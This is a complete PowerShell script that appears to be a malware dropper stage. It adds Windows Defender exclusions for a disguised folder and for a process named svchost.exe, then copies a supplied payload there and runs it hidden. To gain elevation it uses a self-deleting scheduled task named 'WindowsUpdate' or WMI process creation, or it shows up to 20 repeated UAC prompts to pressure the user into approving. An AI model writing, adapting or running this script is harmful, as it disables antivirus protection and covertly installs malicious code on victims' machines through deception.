# Enhanced UAC Loop Script for Defender Exclusion
# Works in VMs with disabled UAC and real systems
# Usage: powershell -EP Bypass -F uac.ps1 -PayloadPath "path" -ProcessName "name"

param(
    [string]$PayloadPath,
    [string]$ProcessName = "svchost.exe"
)

# Create exclusion folder
$ExclusionFolder = "$env:ProgramData\Windows"
if (!(Test-Path $ExclusionFolder)) {
    New-Item -ItemType Directory -Path $ExclusionFolder -Force | Out-Null
}

$PermanentPath = "$ExclusionFolder\$ProcessName"

# Check if already admin
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    # Already admin - add exclusions directly without UAC
    try {
        Add-MpPreference -ExclusionPath $ExclusionFolder -EA 0
        Add-MpPreference -ExclusionProcess $ProcessName -EA 0
        Copy-Item $PayloadPath $PermanentPath -Force
        Start-Process $PermanentPath -WindowStyle Hidden
        exit 0
    } catch {
        # Silent fail
    }
}

# Check UAC level (VM detection)
$UACLevel = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -EA 0).ConsentPromptBehaviorAdmin

if ($UACLevel -eq 0 -or $null -eq $UACLevel) {
    # UAC is disabled (common in VMs) - try silent methods
    
    # Method 1: Task Scheduler (works without UAC)
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-W Hidden -C `"Add-MpPreference -ExclusionPath '$ExclusionFolder' -EA 0; Add-MpPreference -ExclusionProcess '$ProcessName' -EA 0; Copy-Item '$PayloadPath' '$PermanentPath' -Force; Start-Process '$PermanentPath' -W Hidden`""
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force -EA 0 | Out-Null
        Start-Sleep -Seconds 5
        Unregister-ScheduledTask -TaskName "WindowsUpdate" -Confirm:$false -EA 0
        
        if (Test-Path $PermanentPath) {
            exit 0
        }
    } catch {}
    
    # Method 2: WMI (works without UAC)
    try {
        $cmd = "cmd /c `"powershell -W Hidden -C `"Add-MpPreference -ExclusionPath '$ExclusionFolder' -EA 0; Add-MpPreference -ExclusionProcess '$ProcessName' -EA 0; Copy-Item '$PayloadPath' '$PermanentPath' -Force; Start-Process '$PermanentPath' -W Hidden`"`""
        ([wmiclass]"Win32_Process").Create($cmd) | Out-Null
        Start-Sleep -Seconds 3
        
        if (Test-Path $PermanentPath) {
            exit 0
        }
    } catch {}
    
    # Method 3: Just copy without elevation (better than nothing)
    try {
        Copy-Item $PayloadPath $PermanentPath -Force
        Start-Process $PermanentPath -WindowStyle Hidden
    } catch {}
    
    exit 0
}

# UAC is enabled - loop 20 times with UAC prompts
1..20 | ForEach-Object {
    try {
        # Create batch file for UAC elevation
        $BatchFile = "$env:TEMP\elevate.bat"
        $BatchContent = @"
@echo off
powershell -Command "Add-MpPreference -ExclusionPath '$ExclusionFolder' -EA 0"
powershell -Command "Add-MpPreference -ExclusionProcess '$ProcessName' -EA 0"
copy "$PayloadPath" "$PermanentPath" /Y
start /B "$PermanentPath"
exit 0
"@
        [IO.File]::WriteAllText($BatchFile, $BatchContent)
        
        # Run with UAC prompt (visible!)
        $process = Start-Process $BatchFile -Verb RunAs -PassThru -Wait -ErrorAction Stop
        
        # Check if successful
        Start-Sleep -Seconds 1
        if (Test-Path $PermanentPath) {
            break
        }
    }
    catch {
        # UAC was declined or error occurred
    }
    
    # Wait before next attempt
    Start-Sleep -Seconds 3
}

